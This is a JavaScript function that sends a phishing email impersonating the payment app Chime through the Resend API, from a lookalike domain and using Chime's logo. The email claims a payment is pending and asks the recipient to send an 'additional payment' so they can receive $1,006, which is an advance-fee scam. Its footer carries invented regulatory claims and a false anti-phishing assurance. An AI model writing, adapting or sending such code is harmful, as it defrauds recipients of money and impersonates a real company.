import dotenv from "dotenv";
import { Resend } from "resend";
dotenv.config();

// send email from resend
export const chimeSendEmail = async ({ email, name, amount }) => {
  const resend = new Resend(process.env.RESEND_API_KEY);

  // subject
  const subject = `Action Required: You've received $${amount}.00 USD.`;

  // transaction id
  const transactionId = "P06-4gH";

  // date and time
  function getFormattedDate() {
    return new Date().toLocaleString("en-US", {
      timeZone: "America/New_York",
      month: "long",
      day: "numeric",
      year: "numeric",
      hour: "numeric",
      minute: "2-digit",
    });
  }
  const date = getFormattedDate();

  // amount to pay
  const amountToPay = (1006 - Number(amount)).toLocaleString();

  // message
  const message = `You've received a payment of $${amount}.00 USD and it is pending due to our new Business Account Policy for payments below $1,000.00.
  To accept this payment automatically, An additional payment of $${amountToPay}.00 USD from the same business account is required.
  Once completed, your account will be credited with the full amount of $1,006.00 USD instantly.`;

  // html
  const html = `
  <div style="font-family: Arial, sans-serif; background-color:#f2f2f2; padding:20px;">
  <table width="100%" cellpadding="0" cellspacing="0" style="max-width:600px; margin:auto; background-color:#ffffff; border-radius:8px; overflow:hidden; box-shadow:0 2px 8px rgba(0,0,0,0.1);">
    
    <!-- Logo Header -->
    <tr>
      <td style="background-color:#0070ba; padding:20px; text-align:center;">
        <img src="https://logos-world.net/wp-content/uploads/2024/10/Chime-Logo-1-500x281.png"
         alt="Company Logo" width="120" style="display:block; margin:auto;">
      </td>
    </tr>

    <!-- Greeting -->
    <tr>
      <td style="padding:20px;">
        <h2 style="margin:0; color:#333;">Hello ${name},</h2>
      </td>
    </tr>

    <!-- Message / Description -->
    <tr>
      <td style="padding:0 20px 20px 20px; color:#555; font-size:14px; line-height:1.5;">
       
        ${message}
      </td>
    </tr>

    <!-- Transaction Details -->
    <tr>
      <td style="padding:0 20px 20px 20px;">
        <table width="100%" cellpadding="10" cellspacing="0" style="border:1px solid #e0e0e0; border-radius:6px;">
          <tr>
            <td style="font-weight:bold; color:#333;">Transaction ID:</td>
            <td style="color:#555;">${transactionId}</td>
          </tr>
          <tr>
            <td style="font-weight:bold; color:#333;">Date:</td>
            <td style="color:#555;">${date}</td>
          </tr>
          <tr>
            <td style="font-weight:bold; color:#333;">Amount:</td>
            <td style="color:#555; font-weight:bold;">$${amount} USD</td>
          </tr>
          <tr>
            <td style="font-weight:bold; color:#333;">Status:</td>
            <td style="color:#28a745; font-weight:bold;">PENDING</td>
          </tr>
        </table>
      </td>
    </tr>
   

    <!-- Social Links -->
  <p style="
    text-align: center;
    margin-top: 10px;
  ">
    <a href="https://twitter.com/chime" style="margin:0 5px;color:#0b4a6f;text-decoration:none;">Twitter</a> |
    <a href="https://instagram.com/chime" style="margin:0 5px;color:#0b4a6f;text-decoration:none;">Instagram</a> |
    <a href="https://facebook.com/chime" style="margin:0 5px;color:#0b4a6f;text-decoration:none;">Facebook</a>
  </p>


    <!-- Footer -->
    <tr>
<td style="padding:20px; font-size:12px; color:#999; text-align:center;">
Chime is committed to preventing fraudulent emails. Emails from Chime will always contain your full name.
Learn to identify phishing
Please don't reply to this email. To get in touch with us, click Help & Contact.
Not sure why you received this email? Learn more
Copyright © 1999-2026 Chime. All rights reserved.
Chime Pte. Ltd. is licensed by the Monetary Authority of United States as a Major Payment Institution under the Payment Services Act 2019.
      </td>
    </tr>

  </table>
</div>
`;
  // send  via email
  const sendEmail = await resend.emails.send({
    from: "CHIMENOTIFICATION <support@send.payservicenotice.com>",
    to: email,
    subject,
    html,
  });

  // check error
  const sendingError = sendEmail?.error?.message;
  if (sendingError) return false;

  // return
  return true;
};
